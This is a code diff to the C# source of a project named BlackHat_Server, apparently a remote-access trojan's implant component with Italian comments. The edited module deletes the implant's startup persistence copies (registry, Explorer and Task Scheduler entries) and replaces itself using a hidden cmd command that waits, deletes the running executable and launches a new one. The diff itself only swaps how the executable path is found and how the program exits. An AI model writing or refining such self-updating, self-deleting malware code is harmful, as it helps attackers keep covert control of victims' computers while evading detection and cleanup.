@@ -1,7 +1,9 @@
 ﻿using System;
 using System.IO;
 using System.Net;
+using System.Reflection;
 using System.Threading;
+using bc.srv;
 using BlackHat_Server.Class;
 
 namespace BlackHat_Server.Muduli.Server_Manager
@@ -37,7 +39,7 @@ namespace BlackHat_Server.Muduli.Server_Manager
 
             // ELIMINAZIONE FILE
             if (ST_Client.Instance.bUseHKCU || ST_Client.Instance.bUseExplorer || ST_Client.Instance.UseTaskScheduler)
-                if (File.Exists(adppDataFilePath) && Application.ExecutablePath != adppDataFilePath)
+                if (File.Exists(adppDataFilePath) && Assembly.GetExecutingAssembly().Location != adppDataFilePath)
                     File.Delete(adppDataFilePath);
 
 
@@ -47,7 +49,7 @@ namespace BlackHat_Server.Muduli.Server_Manager
 
                 var fileToDel = Path.Combine(startup, ST_Client.Instance.sStartupFileName);
 
-                if (File.Exists(fileToDel) && Application.ExecutablePath != fileToDel)
+                if (File.Exists(fileToDel) && Assembly.GetExecutingAssembly().Location != fileToDel)
                     File.Delete(fileToDel);
             }
 
@@ -95,14 +97,14 @@ namespace BlackHat_Server.Muduli.Server_Manager
                 // SOSTITUISCO L'ESEGUIBILE E MI RIESEGUO!
 
                 var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\" & \"{1}\"  ",
-                    Application.ExecutablePath, tmpFilePath);
+                    Assembly.GetExecutingAssembly().Location, tmpFilePath);
 
                 var dr = new DosRunner();
 
                 dr.RunDosSelfDelete(arg);
 
 
-                Application.Exit();
+                Program.Exit(4);
             }
             catch
             {
